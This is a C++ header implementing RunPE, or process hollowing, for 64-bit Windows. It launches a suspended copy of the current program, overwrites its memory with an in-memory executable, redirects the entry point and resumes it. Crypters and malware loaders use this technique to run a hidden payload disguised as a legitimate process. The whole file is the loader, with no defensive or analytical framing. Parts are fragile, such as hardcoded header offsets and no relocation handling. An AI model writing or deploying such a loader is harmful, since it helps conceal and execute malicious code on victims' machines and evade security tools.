#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>


namespace runpe {
	inline int runPe(unsigned char* rawData) {

		//Create a process
		//write exe memory to it
		//set context for the process
		//resume process thread (continue execution)
		void* pe = rawData;
		IMAGE_DOS_HEADER* DOSHeader;
		IMAGE_NT_HEADERS64* NtHeader;
		IMAGE_SECTION_HEADER* SectionHeader;

		PROCESS_INFORMATION PI;
		STARTUPINFOA SI;
		ZeroMemory(&PI, sizeof(PI));
		ZeroMemory(&SI, sizeof(SI));


		void* pImageBase;

		char currentFilePath[1024];

		DOSHeader = PIMAGE_DOS_HEADER(pe);
		NtHeader = PIMAGE_NT_HEADERS64(DWORD64(pe) + DOSHeader->e_lfanew);

		if (NtHeader->Signature == IMAGE_NT_SIGNATURE) {

			GetModuleFileNameA(NULL, currentFilePath, MAX_PATH);
			//create process
			if (CreateProcessA(currentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {

				CONTEXT* CTX;
				CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
				CTX->ContextFlags = CONTEXT_FULL;


				UINT64 imageBase = 0;
				if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) {

					/*typedef struct _PEB
					{
						BOOLEAN InheritedAddressSpace; // size: 1
						BOOLEAN ReadImageFileExecOptions; // size : 1
						BOOLEAN BeingDebugged; // size : 1
						BOOLEAN SpareBool; // size : 1
										// on 64bit here there is a padding to the sizeof ULONGLONG (DWORD64)
						HANDLE Mutant; // this field have DWORD size on 32bit, and ULONGLONG (DWORD64) size on 64bit

						PVOID ImageBaseAddress;
						[...]
						*/
						//DWORD64 imageBase;

					pImageBase = VirtualAllocEx(
						PI.hProcess,
						LPVOID(NtHeader->OptionalHeader.ImageBase),
						NtHeader->OptionalHeader.SizeOfImage,
						MEM_COMMIT | MEM_RESERVE,
						PAGE_EXECUTE_READWRITE
					);


					WriteProcessMemory(PI.hProcess, pImageBase, pe, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
					//write pe sections
					for (size_t i = 0; i < NtHeader->FileHeader.NumberOfSections; i++)
					{
						//109 hex offset from PE head to section
						SectionHeader = PIMAGE_SECTION_HEADER(DWORD64(pe) + DOSHeader->e_lfanew + 264 + (i * 40));

						WriteProcessMemory(
							PI.hProcess,
							LPVOID(DWORD64(pImageBase) + SectionHeader->VirtualAddress),
							LPVOID(DWORD64(pe) + SectionHeader->PointerToRawData),
							SectionHeader->SizeOfRawData,
							NULL
						);

						//over context image base
						WriteProcessMemory(
							PI.hProcess,
							LPVOID(CTX->Rdx + 0x10),
							LPVOID(&NtHeader->OptionalHeader.ImageBase),
							8,
							NULL
						);

					}

					//set the entry point address in RCX register
					CTX->Rcx = DWORD64(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
					SetThreadContext(PI.hThread, LPCONTEXT(CTX));
					ResumeThread(PI.hThread);

					WaitForSingleObject(PI.hProcess, NULL);

					return 0;

				}
			}
		}
	}

}